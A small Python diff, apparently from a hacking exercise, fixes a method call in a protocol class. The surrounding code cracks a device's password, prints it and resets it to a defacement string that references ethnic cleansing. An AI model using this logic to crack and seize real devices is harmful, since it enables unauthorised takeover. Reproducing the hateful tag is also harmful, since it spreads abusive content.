@@ -55,7 +55,7 @@ class ReprogrammingClientProtocol(Protocol):
                 req.Checksum = checksum
                 pw = crackRequestPW(req)
                 print("Password is %s" % pw)
-                reprogram(pw, "PASSWORD", "~EthnicClensisStan~Was~Here~123123123")
+                self.reprogram(pw, "PASSWORD", "~EthnicClensisStan~Was~Here~123123123")
             except:
                 print("Error on password cracking")
 
